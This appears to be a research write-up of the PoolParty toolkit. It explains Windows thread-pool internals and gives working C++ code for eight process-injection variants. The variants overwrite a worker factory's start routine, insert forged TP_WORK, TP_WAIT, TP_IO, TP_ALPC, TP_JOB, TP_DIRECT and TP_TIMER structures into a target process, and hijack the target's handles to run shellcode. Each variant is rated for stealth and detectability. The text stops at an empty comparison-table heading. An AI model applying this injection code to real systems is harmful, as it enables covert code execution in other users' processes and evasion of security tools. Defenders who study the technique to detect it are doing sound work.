# PoolParty - Process Injection via Thread Pool Manipulation

**Research Domain**: Process Injection Techniques
**Reference Path**: `Refs/codebases/PoolParty/`
**Architecture**: Windows Thread Pool Internals
**Attack Surface**: Worker Factory, IO Completion Ports, Thread Pool Objects

---

## 1. POOL-BASED INJECTION FUNDAMENTALS

### Worker Factory Exploitation

**Core Concept**: Thread pools use Worker Factory objects to manage worker threads. Each pool has a `StartRoutine` pointer executed by newly created workers.

#### Worker Factory Basic Information Structure
`PoolParty/WorkerFactory.hpp:29-55`
```c
typedef struct _WORKER_FACTORY_BASIC_INFORMATION {
    LARGE_INTEGER Timeout;
    LARGE_INTEGER RetryTimeout;
    LARGE_INTEGER IdleTimeout;
    BOOLEAN Paused;
    BOOLEAN TimerSet;
    BOOLEAN QueuedToExWorker;
    BOOLEAN MayCreate;
    BOOLEAN CreateInProgress;
    BOOLEAN InsertedIntoQueue;
    BOOLEAN Shutdown;
    ULONG BindingCount;
    ULONG ThreadMinimum;
    ULONG ThreadMaximum;
    ULONG PendingWorkerCount;
    ULONG WaitingWorkerCount;
    ULONG TotalWorkerCount;
    ULONG ReleaseCount;
    LONGLONG InfiniteWaitGoal;
    PVOID StartRoutine;          // <-- CRITICAL: Function pointer
    PVOID StartParameter;        // <-- CRITICAL: TP_POOL pointer
    HANDLE ProcessId;
    SIZE_T StackReserve;
    SIZE_T StackCommit;
    NTSTATUS LastThreadCreationStatus;
} WORKER_FACTORY_BASIC_INFORMATION;
```

#### Query/Set Worker Factory Information
`PoolParty/WorkerFactory.hpp:90-105`
- `NtQueryInformationWorkerFactory()` - Read worker factory state
- `NtSetInformationWorkerFactory()` - Modify worker factory settings

**Key Fields**:
- `StartRoutine` - Function pointer executed by new worker threads
- `StartParameter` - Context passed to StartRoutine (typically TP_POOL structure)
- `ThreadMinimum` - Increasing this triggers new worker creation

#### Wrapper Implementation
`PoolParty/WorkerFactory.cpp:3-37`
```c
void w_NtQueryInformationWorkerFactory(
    HANDLE hWorkerFactory,
    QUERY_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength,
    PULONG ReturnLength
);

void w_NtSetInformationWorkerFactory(
    HANDLE hWorkerFactory,
    SET_WORKERFACTORYINFOCLASS WorkerFactoryInformationClass,
    PVOID WorkerFactoryInformation,
    ULONG WorkerFactoryInformationLength
);
```

### Thread Pool Internal Structures

#### TP_POOL (Full Structure)
`PoolParty/ThreadPool.hpp:99-133`
```c
typedef struct _FULL_TP_POOL {
    struct _TPP_REFCOUNT Refcount;
    long Padding_239;
    union _TPP_POOL_QUEUE_STATE QueueState;
    struct _TPP_QUEUE* TaskQueue[3];           // High/Normal/Low priority
    struct _TPP_NUMA_NODE* NumaNode;
    struct _GROUP_AFFINITY* ProximityInfo;
    void* WorkerFactory;                       // <-- Worker factory handle
    void* CompletionPort;                      // <-- IO completion port
    struct _RTL_SRWLOCK Lock;
    struct _LIST_ENTRY PoolObjectList;
    struct _LIST_ENTRY WorkerList;
    struct _TPP_TIMER_QUEUE TimerQueue;        // <-- Timer queue for TP_TIMER
    // ... additional fields
} FULL_TP_POOL;
```

**Critical Components**:
- `WorkerFactory` - Handle to TpWorkerFactory object
- `CompletionPort` - Handle to IoCompletion object (dequeues work items)
- `TaskQueue[3]` - High/Normal/Low priority work queues
- `TimerQueue` - Manages timer-based work items

---

## 2. INJECTION VARIANTS

### Variant 1: Worker Factory Start Routine Overwrite
**Class**: `WorkerFactoryStartRoutineOverwrite`
**Files**: `PoolParty/PoolParty.hpp:76-86`, `PoolParty/PoolParty.cpp:84-106`

**Mechanism**:
1. Hijack target's Worker Factory handle
2. Query `WORKER_FACTORY_BASIC_INFORMATION` to get current state
3. **Overwrite `StartRoutine` field** with shellcode address
4. Increase `ThreadMinimum` to trigger worker creation

**Implementation**:
```c
// PoolParty.cpp:89-106
void WorkerFactoryStartRoutineOverwrite::HijackHandles() {
    m_p_hWorkerFactory = this->GetTargetThreadPoolWorkerFactoryHandle();
    m_WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation(*m_p_hWorkerFactory);
}

LPVOID WorkerFactoryStartRoutineOverwrite::AllocateShellcodeMemory() const {
    // Reuse existing StartRoutine memory location
    return m_WorkerFactoryInformation.StartRoutine;
}

void WorkerFactoryStartRoutineOverwrite::SetupExecution() const {
    ULONG WorkerFactoryMinimumThreadNumber = m_WorkerFactoryInformation.TotalWorkerCount + 1;
    w_NtSetInformationWorkerFactory(*m_p_hWorkerFactory,
                                     WorkerFactoryThreadMinimum,
                                     &WorkerFactoryMinimumThreadNumber,
                                     sizeof(ULONG));
}
```

**Pros**:
- Direct execution - no complex structure manipulation
- Triggers immediately when worker is created
- Simple and reliable

**Cons**:
- Overwrites legitimate StartRoutine (destructive)
- Extremely detectable (corrupts thread pool functionality)
- Not stealthy

---

### Variant 2: Remote TP_WORK Insertion
**Class**: `RemoteTpWorkInsertion`
**Files**: `PoolParty/PoolParty.hpp:88-96`, `PoolParty/PoolParty.cpp:108-146`

**TP_WORK Structure**:
`PoolParty/ThreadPool.hpp:246-252`
```c
typedef struct _FULL_TP_WORK {
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;  // Contains callback pointer
    struct _TP_TASK Task;                                 // Contains ListEntry
    volatile union _TPP_WORK_STATE WorkState;             // State flags
} FULL_TP_WORK;
```

**Mechanism**:
1. Create local TP_WORK with `CreateThreadpoolWork()` using shellcode as callback
2. Modify `CleanupGroupMember.Pool` to point to target's TP_POOL
3. Set `Task.ListEntry.Flink/Blink` to target's high-priority task queue
4. Set `WorkState.Exchange = 0x2` (pending callback count)
5. Allocate remote TP_WORK in target process
6. Write crafted structure to target
7. **Modify target's TaskQueue head to point to remote TP_WORK**

**Implementation**:
```c
// PoolParty.cpp:119-146
void RemoteTpWorkInsertion::SetupExecution() const {
    auto WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation(*m_p_hWorkerFactory);

    // Read target's TP_POOL structure
    const auto TargetTpPool = w_ReadProcessMemory<FULL_TP_POOL>(*m_p_hTargetPid,
                                                                 WorkerFactoryInformation.StartParameter);
    const auto TargetTaskQueueHighPriorityList = &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue;

    // Create and configure TP_WORK
    const auto pTpWork = w_CreateThreadpoolWork((PTP_WORK_CALLBACK)m_ShellcodeAddress, nullptr, nullptr);
    pTpWork->CleanupGroupMember.Pool = (PFULL_TP_POOL)WorkerFactoryInformation.StartParameter;
    pTpWork->Task.ListEntry.Flink = TargetTaskQueueHighPriorityList;
    pTpWork->Task.ListEntry.Blink = TargetTaskQueueHighPriorityList;
    pTpWork->WorkState.Exchange = 0x2;

    // Write to target and link into task queue
    const auto pRemoteTpWork = (PFULL_TP_WORK)w_VirtualAllocEx(*m_p_hTargetPid,
                                                                 sizeof(FULL_TP_WORK),
                                                                 MEM_COMMIT | MEM_RESERVE,
                                                                 PAGE_READWRITE);
    w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK));

    // Hijack queue head
    auto RemoteWorkItemTaskList = &pRemoteTpWork->Task.ListEntry;
    w_WriteProcessMemory(*m_p_hTargetPid,
                         &TargetTpPool->TaskQueue[TP_CALLBACK_PRIORITY_HIGH]->Queue.Flink,
                         &RemoteWorkItemTaskList,
                         sizeof(RemoteWorkItemTaskList));
}
```

**Pros**:
- Uses legitimate thread pool dispatch mechanism
- Integrated into existing work queue
- Non-destructive to pool functionality

**Cons**:
- Requires detailed knowledge of TP_WORK layout
- More complex structure manipulation
- Requires worker factory handle access

---

### Variant 3: Remote TP_WAIT Insertion
**Class**: `RemoteTpWaitInsertion`
**Files**: `PoolParty/PoolParty.hpp:98-103`, `PoolParty/PoolParty.cpp:148-176`

**TP_WAIT Structure**:
`PoolParty/ThreadPool.hpp:281-301`
```c
typedef struct _FULL_TP_WAIT {
    struct _FULL_TP_TIMER Timer;                // Inherits from TP_TIMER
    void* Handle;                               // Wait object handle
    void* WaitPkt;                              // Wait packet
    void* NextWaitHandle;
    union _LARGE_INTEGER NextWaitTimeout;
    struct _TP_DIRECT Direct;                   // Contains callback
    // ... flags
} FULL_TP_WAIT;
```

**TP_DIRECT Structure**:
`PoolParty/ThreadPool.hpp:42-51`
```c
typedef struct _TP_DIRECT {
    struct _TP_TASK Task;
    UINT64 Lock;
    struct _LIST_ENTRY IoCompletionInformationList;
    void* Callback;                             // <-- Shellcode pointer
    UINT32 NumaNode;
    UINT8 IdealProcessor;
} TP_DIRECT;
```

**Mechanism**:
1. Create local TP_WAIT with `CreateThreadpoolWait()` using shellcode callback
2. Allocate remote TP_WAIT and TP_DIRECT in target
3. Write both structures to target
4. Create event object
5. **Use `NtAssociateWaitCompletionPacket()`** to associate event with target's IO completion port
6. Signal event to trigger shellcode execution

**Implementation**:
```c
// PoolParty.cpp:153-176
void RemoteTpWaitInsertion::SetupExecution() const {
    const auto pTpWait = w_CreateThreadpoolWait((PTP_WAIT_CALLBACK)m_ShellcodeAddress, nullptr, nullptr);

    const auto pRemoteTpWait = (PFULL_TP_WAIT)w_VirtualAllocEx(*m_p_hTargetPid,
                                                                 sizeof(FULL_TP_WAIT),
                                                                 MEM_COMMIT | MEM_RESERVE,
                                                                 PAGE_READWRITE);
    w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpWait, pTpWait, sizeof(FULL_TP_WAIT));

    const auto pRemoteTpDirect = (PTP_DIRECT)w_VirtualAllocEx(*m_p_hTargetPid,
                                                                sizeof(TP_DIRECT),
                                                                MEM_COMMIT | MEM_RESERVE,
                                                                PAGE_READWRITE);
    w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpDirect, &pTpWait->Direct, sizeof(TP_DIRECT));

    const auto p_hEvent = w_CreateEvent(nullptr, FALSE, FALSE, POOL_PARTY_EVENT_NAME);

    // Associate wait packet with target's IO completion port
    w_ZwAssociateWaitCompletionPacket(pTpWait->WaitPkt,
                                      *m_p_hIoCompletion,
                                      *p_hEvent,
                                      pRemoteTpDirect,
                                      pRemoteTpWait,
                                      0, 0, nullptr);

    w_SetEvent(*p_hEvent);  // Trigger execution
}
```

**Pros**:
- Uses event signaling (common operation)
- Non-destructive
- Asynchronous trigger mechanism

**Cons**:
- Requires IO completion port handle
- More moving parts (event + wait packet)

---

### Variant 4: Remote TP_IO Insertion
**Class**: `RemoteTpIoInsertion`
**Files**: `PoolParty/PoolParty.hpp:105-110`, `PoolParty/PoolParty.cpp:178-220`

**TP_IO Structure**:
`PoolParty/ThreadPool.hpp:303-310`
```c
typedef struct _FULL_TP_IO {
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;  // Contains callback
    struct _TP_DIRECT Direct;                             // IO completion context
    void* File;                                           // File handle
    volatile INT32 PendingIrpCount;
} FULL_TP_IO;
```

**Mechanism**:
1. Create temporary file (`PoolParty.txt`)
2. Create TP_IO with `CreateThreadpoolIo()` using shellcode callback
3. Manually set `CleanupGroupMember.Callback` (not set by API)
4. Increment `PendingIrpCount` to mark async operation in progress
5. Allocate remote TP_IO in target
6. Write structure to target
7. **Use `NtSetInformationFile()` to associate file with target's IO completion port**
8. Write to file to trigger IO completion

**Implementation**:
```c
// PoolParty.cpp:183-220
void RemoteTpIoInsertion::SetupExecution() const {
    const auto p_hFile = w_CreateFile(POOL_PARTY_FILE_NAME,
                                       GENERIC_WRITE,
                                       FILE_SHARE_READ | FILE_SHARE_WRITE,
                                       nullptr,
                                       CREATE_ALWAYS,
                                       FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
                                       nullptr);

    const auto pTpIo = w_CreateThreadpoolIo(*p_hFile,
                                             (PTP_WIN32_IO_CALLBACK)m_ShellcodeAddress,
                                             nullptr, nullptr);

    // Manual callback setup (API doesn't set this)
    pTpIo->CleanupGroupMember.Callback = m_ShellcodeAddress;
    ++pTpIo->PendingIrpCount;

    const auto pRemoteTpIo = (PFULL_TP_IO)w_VirtualAllocEx(*m_p_hTargetPid,
                                                             sizeof(FULL_TP_IO),
                                                             MEM_COMMIT | MEM_RESERVE,
                                                             PAGE_READWRITE);
    w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpIo, pTpIo, sizeof(FULL_TP_IO));

    // Associate file with target's completion port
    IO_STATUS_BLOCK IoStatusBlock{ 0 };
    FILE_COMPLETION_INFORMATION FileIoCompletionInformation{ 0 };
    FileIoCompletionInformation.Port = *m_p_hIoCompletion;
    FileIoCompletionInformation.Key = &pRemoteTpIo->Direct;
    w_ZwSetInformationFile(*p_hFile,
                           &IoStatusBlock,
                           &FileIoCompletionInformation,
                           sizeof(FILE_COMPLETION_INFORMATION),
                           FileReplaceCompletionInformation);

    // Trigger IO completion
    const std::string Buffer = POOL_PARTY_POEM;
    OVERLAPPED Overlapped{ 0 };
    w_WriteFile(*p_hFile, Buffer.c_str(), Buffer.length(), nullptr, &Overlapped);
}
```

**Pros**:
- Uses legitimate file I/O operations
- Very stealthy trigger mechanism
- Minimal thread pool structure modification

**Cons**:
- Leaves file artifact on disk
- Requires IO completion port handle
- More complex setup

---

### Variant 5: Remote TP_ALPC Insertion
**Class**: `RemoteTpAlpcInsertion`
**Files**: `PoolParty/PoolParty.hpp:112-117`, `PoolParty/PoolParty.cpp:222-290`

**TP_ALPC Structure**:
`PoolParty/ThreadPool.hpp:312-327`
```c
typedef struct _FULL_TP_ALPC {
    struct _TP_DIRECT Direct;
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;  // Contains callback
    void* AlpcPort;
    INT32 DeferredSendCount;
    INT32 LastConcurrencyCount;
    union {
        UINT32 Flags;
        UINT32 ExTypeCallback : 1;
        UINT32 CompletionListRegistered : 1;
        UINT32 Reserved : 30;
    };
} FULL_TP_ALPC;
```

**Mechanism**:
1. Create temporary ALPC port for TP_ALPC structure allocation
2. Use `TpAllocAlpcCompletion()` to create TP_ALPC with shellcode callback
3. Create named ALPC port (`\\RPC Control\\PoolPartyALPCPort`)
4. Allocate remote TP_ALPC in target
5. Write structure to target
6. **Use `NtAlpcSetInformation()` to associate ALPC port with target's IO completion port**
7. Connect to ALPC port to trigger completion

**Implementation**:
```c
// PoolParty.cpp:228-290
void RemoteTpAlpcInsertion::SetupExecution() const {
    // Temp ALPC port for structure allocation only
    const auto hTempAlpcConnectionPort = w_NtAlpcCreatePort(nullptr, nullptr);

    const auto pTpAlpc = w_TpAllocAlpcCompletion(hTempAlpcConnectionPort,
                                                  (PTP_ALPC_CALLBACK)m_ShellcodeAddress,
                                                  nullptr, nullptr);

    UNICODE_STRING usAlpcPortName = INIT_UNICODE_STRING(POOL_PARTY_ALPC_PORT_NAME);
    OBJECT_ATTRIBUTES AlpcObjectAttributes{ 0 };
    AlpcObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
    AlpcObjectAttributes.ObjectName = &usAlpcPortName;

    ALPC_PORT_ATTRIBUTES AlpcPortAttributes{ 0 };
    AlpcPortAttributes.Flags = 0x20000;
    AlpcPortAttributes.MaxMessageLength = 328;

    const auto hAlpcConnectionPort = w_NtAlpcCreatePort(&AlpcObjectAttributes, &AlpcPortAttributes);

    const auto pRemoteTpAlpc = (PFULL_TP_ALPC)w_VirtualAllocEx(*m_p_hTargetPid,
                                                                 sizeof(FULL_TP_ALPC),
                                                                 MEM_COMMIT | MEM_RESERVE,
                                                                 PAGE_READWRITE);
    w_WriteProcessMemory(*m_p_hTargetPid, pRemoteTpAlpc, pTpAlpc, sizeof(FULL_TP_ALPC));

    // Associate ALPC port with target's completion port
    ALPC_PORT_ASSOCIATE_COMPLETION_PORT AlpcPortAssociateCompletionPort{ 0 };
    AlpcPortAssociateCompletionPort.CompletionKey = pRemoteTpAlpc;
    AlpcPortAssociateCompletionPort.CompletionPort = *m_p_hIoCompletion;
    w_NtAlpcSetInformation(hAlpcConnectionPort,
                           AlpcAssociateCompletionPortInformation,
                           &AlpcPortAssociateCompletionPort,
                           sizeof(ALPC_PORT_ASSOCIATE_COMPLETION_PORT));

    // Connect to trigger completion
    ALPC_MESSAGE ClientAlpcPortMessage{ 0 };
    const std::string Buffer = POOL_PARTY_POEM;
    ClientAlpcPortMessage.PortHeader.u1.s1.DataLength = Buffer.length();
    ClientAlpcPortMessage.PortHeader.u1.s1.TotalLength = sizeof(PORT_MESSAGE) + Buffer.length();
    std::copy(Buffer.begin(), Buffer.end(), ClientAlpcPortMessage.PortMessage);

    LARGE_INTEGER liTimeout{ 0 };
    liTimeout.QuadPart = -10000000;  // 1 second timeout

    w_NtAlpcConnectPort(&usAlpcPortName, &AlpcClientObjectAttributes, &AlpcPortAttributes,
                        0x20000, nullptr, (PPORT_MESSAGE)&ClientAlpcPortMessage,
                        &szClientAlpcPortMessage, nullptr, nullptr, &liTimeout);
}
```

**Pros**:
- Uses IPC mechanism (common in Windows)
- Named ALPC ports are legitimate
- Sophisticated trigger mechanism

**Cons**:
- Complex setup with multiple ALPC calls
- Creates named kernel object (detectable)
- Requires IO completion port handle

---

### Variant 6: Remote TP_JOB Insertion
**Class**: `RemoteTpJobInsertion`
**Files**: `PoolParty/PoolParty.hpp:119-124`, `PoolParty/PoolParty.cpp:292-322`

**TP_JOB Structure**:
`PoolParty/ThreadPool.hpp:329-341`
```c
typedef struct _FULL_TP_JOB {
    struct _TP_DIRECT Direct;
    struct _TPP_CLEANUP_GROUP_MEMBER CleanupGroupMember;
    void* JobHandle;
    union {
        volatile int64_t CompletionState;
        int64_t Rundown : 1;
        int64_t CompletionCount : 63;
    };
    struct _RTL_SRWLOCK RundownLock;
} FULL_TP_JOB;
```

**Mechanism**:
1. Create job object with `CreateJobObject()`
2. Use `TpAllocJobNotification()` to create TP_JOB with shellcode callback
3. Allocate remote TP_JOB in target
4. Write structure to target
5. **Zero out job's completion port** with `SetInformationJobObject()`
6. **Re-associate job with target's IO completion port**
7. Assign current process to job to trigger completion

**Implementation**:
```c
// PoolParty.cpp:297-322
void RemoteTpJobInsertion::SetupExecution() const {
    const auto p_hJob = w_CreateJobObject(nullptr, POOL_PARTY_JOB_NAME);

    const auto pTpJob = w_TpAllocJobNotification(*p_hJob, m_ShellcodeAddress, nullptr, nullptr);

    const auto RemoteTpJobAddress = (PFULL_TP_JOB)w_VirtualAllocEx(*m_p_hTargetPid,
                                                                     sizeof(FULL_TP_JOB),
                                                                     MEM_COMMIT | MEM_RESERVE,
                                                                     PAGE_READWRITE);
    w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpJobAddress, pTpJob, sizeof(FULL_TP_JOB));

    // Zero out existing completion port association
    JOBOBJECT_ASSOCIATE_COMPLETION_PORT JobAssociateCompletionPort{ 0 };
    w_SetInformationJobObject(*p_hJob,
                              JobObjectAssociateCompletionPortInformation,
                              &JobAssociateCompletionPort,
                              sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

    // Re-associate with target's completion port
    JobAssociateCompletionPort.CompletionKey = RemoteTpJobAddress;
    JobAssociateCompletionPort.CompletionPort = *m_p_hIoCompletion;
    w_SetInformationJobObject(*p_hJob,
                              JobObjectAssociateCompletionPortInformation,
                              &JobAssociateCompletionPort,
                              sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT));

    // Trigger by assigning current process to job
    w_AssignProcessToJobObject(*p_hJob, GetCurrentProcess());
}
```

**Pros**:
- Job objects are common in process management
- Clean trigger mechanism
- Non-destructive

**Cons**:
- Creates named job object (detectable)
- Assigns injector process to job (behavioral artifact)
- Requires IO completion port handle

---

### Variant 7: Remote TP_DIRECT Insertion
**Class**: `RemoteTpDirectInsertion`
**Files**: `PoolParty/PoolParty.hpp:126-131`, `PoolParty/PoolParty.cpp:324-342`

**Mechanism**:
1. Craft minimal TP_DIRECT structure with shellcode as callback
2. Allocate remote TP_DIRECT in target
3. Write structure to target
4. **Directly queue to IO completion port** with `NtSetIoCompletion()`

**Implementation**:
```c
// PoolParty.cpp:329-342
void RemoteTpDirectInsertion::SetupExecution() const {
    TP_DIRECT Direct{ 0 };
    Direct.Callback = m_ShellcodeAddress;

    const auto RemoteDirectAddress = (PTP_DIRECT)w_VirtualAllocEx(*m_p_hTargetPid,
                                                                    sizeof(TP_DIRECT),
                                                                    MEM_COMMIT | MEM_RESERVE,
                                                                    PAGE_READWRITE);
    w_WriteProcessMemory(*m_p_hTargetPid, RemoteDirectAddress, &Direct, sizeof(TP_DIRECT));

    // Directly queue completion packet
    w_ZwSetIoCompletion(*m_p_hIoCompletion, RemoteDirectAddress, 0, 0, 0);
}
```

**Pros**:
- **Simplest implementation**
- Direct queuing - no intermediate objects
- Minimal structure manipulation
- Very fast execution

**Cons**:
- Direct syscall to queue completion (potentially suspicious)
- Still requires IO completion port handle
- Less stealthy than event/file/ALPC triggers

---

### Variant 8: Remote TP_TIMER Insertion
**Class**: `RemoteTpTimerInsertion`
**Files**: `PoolParty/PoolParty.hpp:133-142`, `PoolParty/PoolParty.cpp:344-397`

**TP_TIMER Structure**:
`PoolParty/ThreadPool.hpp:254-279`
```c
typedef struct _FULL_TP_TIMER {
    struct _FULL_TP_WORK Work;                    // Inherits TP_WORK
    struct _RTL_SRWLOCK Lock;
    union {
        struct _TPP_PH_LINKS WindowEndLinks;      // Priority heap links
        struct _LIST_ENTRY ExpirationLinks;
    };
    struct _TPP_PH_LINKS WindowStartLinks;        // Priority heap links
    INT64 DueTime;
    struct _TPP_ITE Ite;
    UINT32 Window;
    UINT32 Period;
    UINT8 Inserted;
    UINT8 WaitTimer;
    union {
        UINT8 TimerStatus;
        UINT8 InQueue : 1;
        UINT8 Absolute : 1;
        UINT8 Cancelled : 1;
    };
    UINT8 BlockInsert;
} FULL_TP_TIMER;
```

**Mechanism**:
1. Hijack both Worker Factory and Timer Queue handles
2. Create TP_TIMER with `CreateThreadpoolTimer()` using shellcode callback
3. Allocate remote TP_TIMER in target (need address before modification)
4. Configure timer:
   - Associate with target's TP_POOL
   - Set DueTime, WindowStart/End keys
   - Set WindowStart/End children Flink/Blink to self-reference remote timer
5. Write timer structure to target
6. **Modify target's TimerQueue.AbsoluteQueue.WindowStart/End roots** to point to remote timer
7. **Trigger timer expiration** with `NtSetTimer2()`

**Implementation**:
```c
// PoolParty.cpp:355-397
void RemoteTpTimerInsertion::SetupExecution() const {
    auto WorkerFactoryInformation = this->GetWorkerFactoryBasicInformation(*m_p_hWorkerFactory);

    const auto pTpTimer = w_CreateThreadpoolTimer((PTP_TIMER_CALLBACK)m_ShellcodeAddress, nullptr, nullptr);

    // Pre-allocate to know remote address for self-references
    const auto RemoteTpTimerAddress = (PFULL_TP_TIMER)w_VirtualAllocEx(*m_p_hTargetPid,
                                                                         sizeof(FULL_TP_TIMER),
                                                                         MEM_COMMIT | MEM_RESERVE,
                                                                         PAGE_READWRITE);

    const auto Timeout = -10000000;  // 1 second
    pTpTimer->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)WorkerFactoryInformation.StartParameter;
    pTpTimer->DueTime = Timeout;
    pTpTimer->WindowStartLinks.Key = Timeout;
    pTpTimer->WindowEndLinks.Key = Timeout;

    // Self-referencing children links
    pTpTimer->WindowStartLinks.Children.Flink = &RemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimer->WindowStartLinks.Children.Blink = &RemoteTpTimerAddress->WindowStartLinks.Children;
    pTpTimer->WindowEndLinks.Children.Flink = &RemoteTpTimerAddress->WindowEndLinks.Children;
    pTpTimer->WindowEndLinks.Children.Blink = &RemoteTpTimerAddress->WindowEndLinks.Children;

    w_WriteProcessMemory(*m_p_hTargetPid, RemoteTpTimerAddress, pTpTimer, sizeof(FULL_TP_TIMER));

    // Hijack timer queue roots
    auto TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
    w_WriteProcessMemory(*m_p_hTargetPid,
                         &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowStart.Root,
                         &TpTimerWindowStartLinks,
                         sizeof(TpTimerWindowStartLinks));

    auto TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
    w_WriteProcessMemory(*m_p_hTargetPid,
                         &pTpTimer->Work.CleanupGroupMember.Pool->TimerQueue.AbsoluteQueue.WindowEnd.Root,
                         &TpTimerWindowEndLinks,
                         sizeof(TpTimerWindowEndLinks));

    // Trigger timer expiration
    LARGE_INTEGER ulDueTime{ 0 };
    ulDueTime.QuadPart = Timeout;
    T2_SET_PARAMETERS Parameters{ 0 };
    w_NtSetTimer2(*m_p_hTimer, &ulDueTime, 0, &Parameters);
}
```

**Pros**:
- Uses timer mechanism (common operation)
- Integrated into timer queue dispatch
- Time-delayed trigger available

**Cons**:
- **Most complex implementation**
- Requires both Worker Factory and Timer handle
- Deep understanding of priority heap structure
- More points of failure

---

## 3. PROCESS TARGETING

### Target Process Selection
`PoolParty/PoolParty.cpp:10-15`

**Required Access Rights**:
```c
PROCESS_VM_READ          // Read target memory
PROCESS_VM_WRITE         // Write shellcode and structures
PROCESS_VM_OPERATION     // Allocate memory
PROCESS_DUP_HANDLE       // Duplicate handles from target
PROCESS_QUERY_INFORMATION // Query process info
```

**Implementation**:
```c
std::shared_ptr<HANDLE> PoolParty::GetTargetProcessHandle() const {
    auto p_hTargetPid = w_OpenProcess(
        PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION |
        PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
        FALSE,
        m_dwTargetPid
    );
    return p_hTargetPid;
}
```

**Target Selection Criteria**:
- Must have active thread pool (most GUI apps, services)
- Must be accessible with required permissions
- Attacker needs SeDebugPrivilege for protected processes

### Handle Hijacking (Handle Duplication Attack)

**Core Technique**: `HijackProcessHandle()`
`PoolParty/HandleHijacker.cpp:4-38`

**Algorithm**:
1. **Enumerate target's handles** with `NtQueryInformationProcess(ProcessHandleInformation)`
2. For each handle in target:
   - Duplicate handle into current process
   - Query object type with `NtQueryObject(ObjectTypeInformation)`
   - If type matches desired (TpWorkerFactory/IoCompletion/IRTimer), return duplicated handle
3. Return duplicated handle with desired access rights

**Implementation**:
```c
std::shared_ptr<HANDLE> HijackProcessHandle(std::wstring wsObjectType,
                                              std::shared_ptr<HANDLE> p_hTarget,
                                              DWORD dwDesiredAccess) {
    // Query all handles in target process
    auto pProcessInformation = w_QueryInformation<decltype(NtQueryInformationProcess),
                                                   HANDLE, PROCESSINFOCLASS>(
        "NtQueryInformationProcess",
        NtQueryInformationProcess,
        *p_hTarget,
        (PROCESSINFOCLASS)ProcessHandleInformation
    );
    const auto pProcessHandleInformation = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)pProcessInformation.data();

    for (auto i = 0; i < pProcessHandleInformation->NumberOfHandles; i++) {
        try {
            // Duplicate handle from target to current process
            p_hDuplicatedObject = w_DuplicateHandle(
                *p_hTarget,
                pProcessHandleInformation->Handles[i].HandleValue,
                GetCurrentProcess(),
                dwDesiredAccess,
                FALSE,
                NULL
            );

            // Query object type
            pObjectInformation = w_QueryInformation<decltype(NtQueryObject),
                                                     HANDLE, OBJECT_INFORMATION_CLASS>(
                "NtQueryObject",
                NtQueryObject,
                *p_hDuplicatedObject,
                ObjectTypeInformation
            );
            pObjectTypeInformation = (PPUBLIC_OBJECT_TYPE_INFORMATION)pObjectInformation.data();

            // Check if type matches
            if (wsObjectType == std::wstring(pObjectTypeInformation->TypeName.Buffer)) {
                return p_hDuplicatedObject;
            }
        }
        catch (std::runtime_error) {}
    }

    throw std::runtime_error("Failed to hijack object handle");
}
```

### Specific Handle Hijackers

#### Worker Factory Handle
`PoolParty/HandleHijacker.cpp:40-43`
```c
std::shared_ptr<HANDLE> HijackWorkerFactoryProcessHandle(std::shared_ptr<HANDLE> p_hTarget) {
    return HijackProcessHandle(L"TpWorkerFactory", p_hTarget, WORKER_FACTORY_ALL_ACCESS);
}
```

**Object Type**: `TpWorkerFactory`
**Access Rights**: `WORKER_FACTORY_ALL_ACCESS` (defined in `WorkerFactory.hpp:15-23`)

**Usage Variants**:
- Variant 1 (StartRoutineOverwrite)
- Variant 2 (TpWorkInsertion)
- Variant 8 (TpTimerInsertion)

#### IO Completion Handle
`PoolParty/HandleHijacker.cpp:45-48`
```c
std::shared_ptr<HANDLE> HijackIoCompletionProcessHandle(std::shared_ptr<HANDLE> p_hTarget) {
    return HijackProcessHandle(L"IoCompletion", p_hTarget, IO_COMPLETION_ALL_ACCESS);
}
```

**Object Type**: `IoCompletion`
**Access Rights**: `IO_COMPLETION_ALL_ACCESS`

**Usage Variants**:
- Variant 3 (TpWaitInsertion)
- Variant 4 (TpIoInsertion)
- Variant 5 (TpAlpcInsertion)
- Variant 6 (TpJobInsertion)
- Variant 7 (TpDirectInsertion)

#### Timer Queue Handle
`PoolParty/HandleHijacker.cpp:50-53`
```c
std::shared_ptr<HANDLE> HijackIRTimerProcessHandle(std::shared_ptr<HANDLE> p_hTarget) {
    return HijackProcessHandle(L"IRTimer", p_hTarget, TIMER_ALL_ACCESS);
}
```

**Object Type**: `IRTimer`
**Access Rights**: `TIMER_ALL_ACCESS`

**Usage Variants**:
- Variant 8 (TpTimerInsertion)

---

## INJECTION FLOW SUMMARY

### Common Pattern (All Variants)
`PoolParty/PoolParty.cpp:63-72`

```c
void PoolParty::Inject() {
    // 1. Open target process with required access
    m_p_hTargetPid = this->GetTargetProcessHandle();

    // 2. Hijack necessary handles (variant-specific)
    this->HijackHandles();

    // 3. Allocate memory for shellcode in target
    m_ShellcodeAddress = this->AllocateShellcodeMemory();

    // 4. Write shellcode to target process
    this->WriteShellcode();

    // 5. Setup execution trigger (variant-specific)
    this->SetupExecution();
}
```

### Variant Comparison Table

